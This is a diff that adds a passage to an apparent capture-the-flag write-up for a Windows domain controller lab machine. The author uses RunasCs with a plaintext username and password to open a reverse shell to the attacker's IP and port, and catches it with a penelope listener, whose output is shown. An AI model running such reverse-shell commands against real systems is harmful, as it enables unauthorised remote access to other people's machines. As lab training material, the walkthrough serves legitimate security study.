@@ -485,3 +485,31 @@ To do this ill grab RunasCs from github and upload it
 
 Ill transfer it using a python web server
 
+```python
+PS C:\temp> .\RunasCs.exe mikasaAckerman IL0v3ErenY3ager cmd.exe -r 10.10.14.61:1338
+.\RunasCs.exe mikasaAckerman IL0v3ErenY3ager cmd.exe -r 10.10.14.61:1338
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-4aa64$\Default
+[+] Async process 'C:\WINDOWS\system32\cmd.exe' with pid 4628 created in background.
+PS C:\temp>
+```
+
+Ill send a connection
+
+```python
+penelope -p 1338         
+[+] Listening for reverse shells on 0.0.0.0:1338 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => DC 10.129.66.164 Microsoft_Windows_Server_2019_Standard-x64-based_PC 👤 freelancer\mikasaackerman 😍️ Session ID <1>
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/DC~10.129.66.164-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_10_03-15_05_29-182.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+C:\WINDOWS\system32>
+```
+
+![](Pasted%20image%2020261003150605.png)
+
+I now have a shell as this user
+
